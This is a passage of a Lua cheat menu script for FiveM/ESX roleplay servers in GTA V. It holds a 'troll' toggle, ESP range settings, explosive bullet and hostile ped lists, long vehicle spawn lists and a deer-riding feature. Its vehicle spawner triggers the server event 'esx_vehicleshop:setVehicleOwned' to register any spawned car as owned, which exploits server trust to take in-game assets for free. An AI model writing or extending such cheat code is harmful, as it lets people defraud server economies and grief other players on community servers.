-- ▄▀▀▀█▀▀▄  ▄▀▀█▀▄    ▄▀▀█▄   ▄▀▀▀▀▄    ▄▀▀▀▀▄       ▄▀▀▄ ▄▀▄  ▄▀▀▀▀▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   
--█    █  ▐ █   █  █  ▐ ▄▀ ▀▄ █         █      █     █  █ ▀  █ █      █ █ ▄▀   █ █     ▄▀  
--▐   █     ▐   █  ▐    █▄▄▄█ █    ▀▄▄  █      █     ▐  █    █ █      █ ▐ █    █ ▐ ▄▄▀▀    
--   █          █      ▄▀   █ █     █ █ ▀▄    ▄▀       █    █  ▀▄    ▄▀   █    █   █       
-- ▄▀        ▄▀▀▀▀▀▄  █   ▄▀  ▐▀▄▄▄▄▀ ▐   ▀▀▀▀       ▄▀   ▄▀     ▀▀▀▀    ▄▀▄▄▄▄▀    ▀▄▄▄▄▀ 
--█         █       █ ▐   ▐   ▐                      █    █             █     ▐         ▐  
--▐         ▐       ▐                                ▐    ▐             ▐                  
local Follow = false

ESX = nil

local untested = {
    state = false
}
local logged = true 

local run = {
    runstate = false ,
    scriptcheck = true ,
    troll = true
}

Citizen.CreateThread(
    function()
        while ESX == nil do
            TriggerEvent(
                'esx:getSharedObject',
                function(c)
                    ESX = c
                end
            )
            Citizen.Wait(1000)
			DisplayRadar(true)
        end
    end
)

local ffs = true

local asstarget = nil

local asshat = false

local PedGuardPlayer = false

local pedlist = {}

local speedmit = false

local aispeed = '50.0'

local PlaceSelf = true
local ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0, 10000.0}
local EspDistance = 500.0

local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1

local currentBullet = 1
local selectedBullet = 1

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = true
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = nil, nil
		disposeFunc(iter)
	end)
end
function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end
 

function GetAllPeds()
    local peds123 = {}
    for ped in EnumeratePeds() do
        if DoesEntityExist(ped) then
            table.insert(peds123, ped)
        end
    end
    return peds123
end



  
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
	local Coordinates = GetEntityCoords(Entity, false)
	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
end

function GetGroundZ(X, Y, Z)
	if tonumber(X) and tonumber(Y) and tonumber(Z) then
		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
		return GroundZ
	else
		return 0.0
	end
end

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end

Citizen.CreateThread(function()
	RequestAnimDict("rcmjosh2")
	while not HasAnimDictLoaded("rcmjosh2") do
		Citizen.Wait(250)
	end
	while true do
		Citizen.Wait(0)



		local Ped = PlayerPedId()
		local AttachedEntity = GetEntityAttachedTo(Ped)

		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
			if DoesEntityExist(Deer.Handle) then
				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
				local Speed, Range = Deer.Speed.Walk, 4000.0


				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

				if Deer.Marker then
					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
				end
			end
		end
	end
end)



function checkValidVehicleExtras()
    local ar = PlayerPedId()
    local as = GetVehiclePedIsIn(ar, false)
    local at = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(as, i) then
            local au = '~h~Extra #' .. tostring(i)
            local E = 'OFF'
            if IsVehicleExtraTurnedOn(as, i) then
                E = 'ON'
            end
            local av = '~h~extra ' .. tostring(i)
            table.insert(
                at,
                {
                    menuName = realModName,
                    data = {['action'] = realSpawnName, ['state'] = E}
                }
            )
        end
    end
    return at
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end



function checkValidVehicleMods(aw)
    local ar = PlayerPedId()
    local as = GetVehiclePedIsIn(ar, false)
    local at = {}
    local ax = GetNumVehicleMods(as, aw)
    if aw == 48 and ax == 0 then
        local ax = GetVehicleLiveryCount(as)
        for i = 1, ax, 1 do
            local ay = i - 1
            local az = GetLiveryName(as, ay)
            local realModName = GetLabelText(az)
            local aA, realSpawnName = aw, ay
            at[i] = {
                menuName = realModName,
                data = {['modid'] = aA, ['realIndex'] = realSpawnName}
            }
        end
    end
    for i = 1, ax, 1 do
        local ay = i - 1
        local az = GetModTextLabel(as, aw, ay)
        local realModName = GetLabelText(az)
        local aA, realSpawnName = ax, ay
        at[i] = {
            menuName = realModName,
            data = {['modid'] = aA, ['realIndex'] = realSpawnName}
        }
    end
    if ax > 0 then
        local ay = -1
        local aA, realSpawnName = aw, ay
        table.insert(
            at,
            1,
            {
                menuName = 'Stock',
                data = {['modid'] = aA, ['realIndex'] = realSpawnName}
            }
        )
    end
    return at
end

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end

local aB = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aC = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aD = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}
local aE = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aF = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aG = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aH = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aI = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aJ = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aK = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aL = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aM = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aN = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aO = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aP = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aQ = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aR = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'TiagoMenu',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aS = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aT = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local aU = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local aV = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local aW = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local aX = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local aY = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local aZ = {
    aB,
    aC,
    aD,
    aE,
    aF,
    aG,
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX
}

local b1 = false
local b2 = false
local b3 = false
local b4 = false
local b5 = nil
local b6 = {}
local b7 = {}
local b8 = nil
local b9 = false
local ba = -1
local bb = -1
local bc = -1
local bd = false
local be = {
    {name = '~h~Spoilers', id = 0},
    {name = '~h~Front Bumper', id = 1},
    {name = '~h~Rear Bumper', id = 2},
    {name = '~h~Side Skirt', id = 3},
    {name = '~h~Exhaust', id = 4},
    {name = '~h~Frame', id = 5},
    {name = '~h~Grille', id = 6},
    {name = '~h~Hood', id = 7},
    {name = '~h~Fender', id = 8},
    {name = '~h~Right Fender', id = 9},
    {name = '~h~Roof', id = 10},
    {name = '~h~Vanity Plates', id = 25},
    {name = '~h~Trim', id = 27},
    {name = '~h~Ornaments', id = 28},
    {name = '~h~Dashboard', id = 29},
    {name = '~h~Dial', id = 30},
    {name = '~h~Door Speaker', id = 31},
    {name = '~h~Seats', id = 32},
    {name = '~h~Steering Wheel', id = 33},
    {name = '~h~Shifter Leavers', id = 34},
    {name = '~h~Plaques', id = 35},
    {name = '~h~Speakers', id = 36},
    {name = '~h~Trunk', id = 37},
    {name = '~h~Hydraulics', id = 38},
    {name = '~h~Engine Block', id = 39},
    {name = '~h~Air Filter', id = 40},
    {name = '~h~Struts', id = 41},
    {name = '~h~Arch Cover', id = 42},
    {name = '~h~Aerials', id = 43},
    {name = '~h~Trim 2', id = 44},
    {name = '~h~Tank', id = 45},
    {name = '~h~Windows', id = 46},
    {name = '~h~Livery', id = 48},
    {name = '~h~Wheels', id = 23},
    {name = '~h~~r~Wheel Types', id = 'wheeltypes'},
    {name = '~h~Extras', id = 'extra'},
    {name = '~h~~o~Neons', id = 'neon'},
    {name = '~h~~p~Paint', id = 'paint'}
}
local bf = {
    {name = '~h~~r~Engine', id = 11},
    {name = '~h~~b~Brakes', id = 12},
    {name = '~h~~g~Transmission', id = 13},
    {name = '~h~~y~Suspension', id = 15}
}
local bg = {
    ['White'] = {255, 255, 255},
    ['Blue'] = {0, 0, 255},
    ['Electric Blue'] = {0, 150, 255},
    ['Mint Green'] = {50, 255, 155},
    ['Lime Green'] = {0, 255, 0},
    ['Yellow'] = {255, 255, 0},
    ['Golden Shower'] = {204, 204, 0},
    ['Orange'] = {255, 128, 0},
    ['Red'] = {255, 0, 0},
    ['Pony Pink'] = {255, 102, 255},
    ['Hot Pink'] = {255, 0, 255},
    ['Purple'] = {153, 0, 153}
}
local bh = {
    {name = '~h~Black', id = 0},
    {name = '~h~Carbon Black', id = 147},
    {name = '~h~Graphite', id = 1},
    {name = '~h~Anhracite Black', id = 11},
    {name = '~h~Black Steel', id = 2},
    {name = '~h~Dark Steel', id = 3},
    {name = '~h~Silver', id = 4},
    {name = '~h~Bluish Silver', id = 5},
    {name = '~h~Rolled Steel', id = 6},
    {name = '~h~Shadow Silver', id = 7},
    {name = '~h~Stone Silver', id = 8},
    {name = '~h~Midnight Silver', id = 9},
    {name = '~h~Cast Iron Silver', id = 10},
    {name = '~h~Red', id = 27},
    {name = '~h~Torino Red', id = 28},
    {name = '~h~Formula Red', id = 29},
    {name = '~h~Lava Red', id = 150},
    {name = '~h~Blaze Red', id = 30},
    {name = '~h~Grace Red', id = 31},
    {name = '~h~Garnet Red', id = 32},
    {name = '~h~Sunset Red', id = 33},
    {name = '~h~Cabernet Red', id = 34},
    {name = '~h~Wine Red', id = 143},
    {name = '~h~Candy Red', id = 35},
    {name = '~h~Hot Pink', id = 135},
    {name = '~h~Pfsiter Pink', id = 137},
    {name = '~h~Salmon Pink', id = 136},
    {name = '~h~Sunrise Orange', id = 36},
    {name = '~h~Orange', id = 38},
    {name = '~h~Bright Orange', id = 138},
    {name = '~h~Gold', id = 99},
    {name = '~h~Bronze', id = 90},
    {name = '~h~Yellow', id = 88},
    {name = '~h~Race Yellow', id = 89},
    {name = '~h~Dew Yellow', id = 91},
    {name = '~h~Dark Green', id = 49},
    {name = '~h~Racing Green', id = 50},
    {name = '~h~Sea Green', id = 51},
    {name = '~h~Olive Green', id = 52},
    {name = '~h~Bright Green', id = 53},
    {name = '~h~Gasoline Green', id = 54},
    {name = '~h~Lime Green', id = 92},
    {name = '~h~Midnight Blue', id = 141},
    {name = '~h~Galaxy Blue', id = 61},
    {name = '~h~Dark Blue', id = 62},
    {name = '~h~Saxon Blue', id = 63},
    {name = '~h~Blue', id = 64},
    {name = '~h~Mariner Blue', id = 65},
    {name = '~h~Harbor Blue', id = 66},
    {name = '~h~Diamond Blue', id = 67},
    {name = '~h~Surf Blue', id = 68},
    {name = '~h~Nautical Blue', id = 69},
    {name = '~h~Racing Blue', id = 73},
    {name = '~h~Ultra Blue', id = 70},
    {name = '~h~Light Blue', id = 74},
    {name = '~h~Chocolate Brown', id = 96},
    {name = '~h~Bison Brown', id = 101},
    {name = '~h~Creeen Brown', id = 95},
    {name = '~h~Feltzer Brown', id = 94},
    {name = '~h~Maple Brown', id = 97},
    {name = '~h~Beechwood Brown', id = 103},
    {name = '~h~Sienna Brown', id = 104},
    {name = '~h~Saddle Brown', id = 98},
    {name = '~h~Moss Brown', id = 100},
    {name = '~h~Woodbeech Brown', id = 102},
    {name = '~h~Straw Brown', id = 99},
    {name = '~h~Sandy Brown', id = 105},
    {name = '~h~Bleached Brown', id = 106},
    {name = '~h~Schafter Purple', id = 71},
    {name = '~h~Spinnaker Purple', id = 72},
    {name = '~h~Midnight Purple', id = 142},
    {name = '~h~Bright Purple', id = 145},
    {name = '~h~Cream', id = 107},
    {name = '~h~Ice White', id = 111},
